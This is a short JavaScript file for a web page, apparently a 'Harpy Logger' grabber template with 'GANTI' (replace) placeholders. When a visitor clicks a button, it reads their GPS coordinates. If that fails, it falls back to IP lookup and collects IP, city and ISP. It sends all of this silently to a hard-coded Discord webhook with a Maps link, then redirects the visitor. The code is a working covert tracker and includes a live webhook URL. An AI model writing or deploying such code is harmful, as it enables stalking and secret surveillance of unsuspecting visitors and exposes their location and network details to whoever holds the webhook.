const WH = "https://discord.com/api/webhooks/1378852645409915124/0lrygidJjMiyT6Hj-h3qefoTQkvJ2gaxThTKoYtmztuu_SK2g_OrcRreGlZ-xPO7WA8F"; // GANTI
const REDIRECT = "#"; // GANTI

function send(title, lat, lon, fields, color=3066993) {
  const link = `https://www.google.com/maps?q=${lat},${lon}`;
  fetch(WH, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: title,
        description: `[View on Google Maps](${link})`,
        color: color,
        fields: fields,
        footer: { text: "Harpy Logger 🦅" },
        timestamp: new Date().toISOString()
      }]
    })
  });
}

document.getElementById("locateee").onclick = () => {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      send(" Real GPS", lat, lon, [
        { name: "Lat", value: String(lat), inline: true },
        { name: "Lon", value: String(lon), inline: true },
        { name: "Source", value: "GPS", inline: true },
      ], 0x00ff00);
      setTimeout(() => location.href = REDIRECT, 2000);
    },
    err => {
      fetch("https://ipapi.co/json/").then(r => r.json()).then(d => {
        send(" IP-Based Location", d.latitude, d.longitude, [
          { name: "IP", value: d.ip, inline: true },
          { name: "City", value: d.city, inline: true },
          { name: "ISP", value: d.org, inline: true },
          { name: "Source", value: "IP Geolocation", inline: true }
        ], 0xff0000);
        setTimeout(() => location.href = REDIRECT, 2000);
      });
    },
    { timeout: 7000 }
    );
};